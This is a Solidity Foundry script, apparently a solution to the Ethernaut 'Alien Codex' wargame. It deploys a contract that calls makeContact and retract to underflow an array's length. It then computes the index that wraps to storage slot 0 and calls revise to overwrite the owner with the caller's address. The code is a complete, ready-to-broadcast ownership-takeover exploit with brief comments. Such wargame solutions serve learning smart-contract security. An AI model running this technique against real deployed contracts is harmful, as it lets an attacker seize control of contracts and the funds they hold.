// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/Script.sol";

import "forge-std/console.sol";

contract hackit {
    // get the address of the contract
    // call the functon makeContact to set it to true
    // call retract to get the underflow and access to the storage of the contract
    // compute the index zero  in which slot it gonna be
    // call the function revise passing the computing index and your address
    address ethernaut = 0x46A236E5A2306aa37FcdDa9CE06527e2d41918b9;

    constructor() {
        (bool ok, ) = ethernaut.call(abi.encodeWithSignature("makeContact()"));
        require(ok);
        (bool okk, ) = ethernaut.call(abi.encodeWithSignature("retract()")); // here we have an array of size 2**256 -1
        require(okk);
        /*
        compute the index of the slot 0 , in the array (address owner );
        ==> we have the slot == 0
        ==> we have the formula : keccak256(startOfArray) + index == slot of index || keccack(a) + b => array[b]
        --> s = keccak256(abi.encode (uint(1)));
        --> slot 0 = s + index?
        index = -s
        */
        uint index;
        unchecked {
            index -= uint(keccak256(abi.encode(uint(1)))); // this is the index of element stored in slot 0 which is owner address
        }
        bytes32 addressme = bytes32(uint256(uint160(tx.origin)));
        (bool okkk, ) = ethernaut.call(
            abi.encodeWithSignature("revise(uint256,bytes32)", index, addressme)
        );
        require(okkk);
    }
}

contract hack is Script {
    function run() public {
        vm.startBroadcast();
        new hackit();
        vm.stopBroadcast();
    }
}
